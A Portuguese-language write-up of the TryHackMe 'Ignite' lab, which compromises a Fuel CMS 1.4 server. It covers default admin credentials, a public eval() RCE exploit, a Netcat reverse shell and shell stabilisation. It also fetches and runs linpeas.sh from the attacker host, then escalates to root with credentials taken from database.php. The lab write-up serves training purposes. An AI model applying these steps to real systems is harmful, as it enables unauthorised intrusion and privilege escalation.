# TryHackMe - Ignite Write-up

## Introdução

O objetivo desta room era explorar uma instância vulnerável do Fuel CMS e obter acesso root na máquina.
O desafio foca em enumeração web, exploração de vulnerabilidades conhecidas, reverse shells e escalação de privilégios através da descoberta de credenciais.

---

# Reconhecimento

O primeiro passo foi realizar um scan com Nmap para identificar portas abertas e serviços em execução.

```bash
nmap 10.XXX.XXX.XX -sS -sV -sC
```

### Resultado do Scan

O scan revelou um serviço HTTP rodando na porta 80 e também mostrou a existência de um arquivo `robots.txt`.

<p align="center">
  <img width="785" height="256" alt="image" src="https://github.com/user-attachments/assets/85159950-1791-4709-afce-fe55501ece61" />
</p>

Como havia um serviço web disponível, o próximo passo foi inspecionar o site.

---

# Enumeração Web

Ao acessar a página, foi exibida a página padrão do **Fuel CMS**, incluindo a versão do CMS.

<p align="center">
  <img width="1392" height="812" alt="image" src="https://github.com/user-attachments/assets/3916a002-8836-4bdd-a6b9-87214c66cdd2" />
</p>

O scan do Nmap já havia mostrado a existência do `robots.txt`, então ele foi analisado em seguida.

Dentro do `robots.txt`, existia um caminho bloqueado apontando para `/fuel`.

<p align="center">
  <img width="910" height="431" alt="image" src="https://github.com/user-attachments/assets/58c979ed-1b6d-432e-95fa-b8d004d7447c" />
</p>

Ao acessar `/fuel`, foi encontrada uma tela de login.

<p align="center">
  <img width="1305" height="507" alt="image" src="https://github.com/user-attachments/assets/c4ed07a3-ef22-4596-9a05-25e88bc8e23d" />
</p>

---

# Credenciais Padrão

Após pesquisar sobre as credenciais padrão do Fuel CMS, foi descoberto que o login default era:

```bash
admin:admin
```

<p align="center">
  <img width="730" height="280" alt="image" src="https://github.com/user-attachments/assets/cdb3ba04-66cd-4606-91d0-b26fd2e9e0fa" />
</p>

Utilizando essas credenciais, foi possível acessar com sucesso o painel administrativo.

<p align="center">
  <img width="1917" height="549" alt="image" src="https://github.com/user-attachments/assets/62c1c39c-a67a-4785-8b42-5169f1c035d1" />
</p>

---

# Exploração

Pesquisando por exploits públicos relacionados à versão instalada do Fuel CMS, foi encontrado um exploit para o **Fuel CMS 1.4**.

A vulnerabilidade explora a falta de filtragem adequada de entradas passadas para a função PHP `eval()`, permitindo **Remote Code Execution (RCE)**.

<p align="center">
  <img width="1828" height="690" alt="image" src="https://github.com/user-attachments/assets/907df0da-ce68-4d81-bdcc-d3028834a982" />
</p>

O exploit foi baixado e executado.

<p align="center">
  <img width="740" height="244" alt="image" src="https://github.com/user-attachments/assets/34749672-25c0-47bb-ba84-5a05a7309da3" />
</p>

A exploração foi bem-sucedida e permitiu execução de comandos na máquina alvo.

---

# Reverse Shell

Apesar de já existir execução de comandos, o shell não era interativo.
Para obter um shell totalmente funcional, foi criada uma reverse shell.

Primeiro, foi iniciado um listener Netcat na máquina atacante:

```bash
nc -lvnp 4444
```

Depois, o payload de reverse shell foi executado através do cmd do exploit.

<p align="center">
  <img width="940" height="115" alt="image" src="https://github.com/user-attachments/assets/2bde6d2b-ef1c-4430-af54-aa37695b8cc8" />
</p>

Após receber a conexão, o shell foi estabilizado utilizando Python PTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

<p align="center">
  <img width="690" height="408" alt="image" src="https://github.com/user-attachments/assets/c1606a1c-a493-49a5-b74a-9575b01e1b72" />
</p>

Isso forneceu um shell interativo mais estável.

---

# User Flag

Com acesso ao shell estabelecido, começou a enumeração do sistema em busca de arquivos importantes e flags.

Dentro do diretório do usuário, a primeira flag foi encontrada.

<p align="center">
  <img width="419" height="208" alt="image" src="https://github.com/user-attachments/assets/94016515-0838-4d74-a53f-d8596d540367" />
</p>

---

# Escalação de Privilégios

Neste ponto, o objetivo passou a ser obter a `root.txt`.

O LinPEAS foi enviado para a máquina e executado para enumeração:

```bash
wget http://10.xxxxxxxx:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Porém, nenhum vetor óbvio de privilege escalation foi identificado.

Como a enumeração automática não trouxe resultados úteis, começou a inspeção manual dos arquivos de configuração do sistema.

Eventualmente, foi encontrado um arquivo `database.php` dentro do diretório:

```bash
/fuel/application/config/database.php
```

<p align="center">
  <img width="669" height="374" alt="image" src="https://github.com/user-attachments/assets/a5b995f7-a736-4eaa-bd0d-aaa65734dc26" />
</p>

Dentro do arquivo estavam expostas as credenciais do usuário root.

<p align="center">
  <img width="451" height="329" alt="image" src="https://github.com/user-attachments/assets/08670e66-89ee-4605-8d02-97cb0d72a5e4" />
</p>

Utilizando a senha encontrada, foi possível trocar para o usuário root:

```bash
su root
```

O acesso root foi obtido com sucesso.

<p align="center">
  <img width="573" height="74" alt="image" src="https://github.com/user-attachments/assets/c38a617c-a54e-4beb-816c-2fc95edca7f5" />
</p>

---

# Root Flag

Por fim, navegando até o diretório root, a flag final foi encontrada.

<p align="center">
  <img width="329" height="109" alt="image" src="https://github.com/user-attachments/assets/4ba8353f-6799-4f97-ba37-3a83a52e36fe" />
</p>

---

# Conclusão

Esta room foi uma ótima introdução para:

* Enumeração Web
* Exploração do Fuel CMS
* Remote Code Execution (RCE)
* Reverse Shells
* Estabilização de Shell
* Enumeração Linux
* Descoberta de Credenciais
* Escalação de Privilégios

A máquina demonstra como credenciais padrão e arquivos de configuração expostos podem representar riscos sérios em ambientes reais.

---

# Ferramentas Utilizadas

* Nmap
* Searchsploit
* Netcat
* Python
* LinPEAS
* Bash

---

# Habilidades Praticadas

* Enumeração
* Exploração Web
* Manipulação de Reverse Shell
* Escalação de Privilégios Linux
* Enumeração Manual
* Descoberta de Credenciais
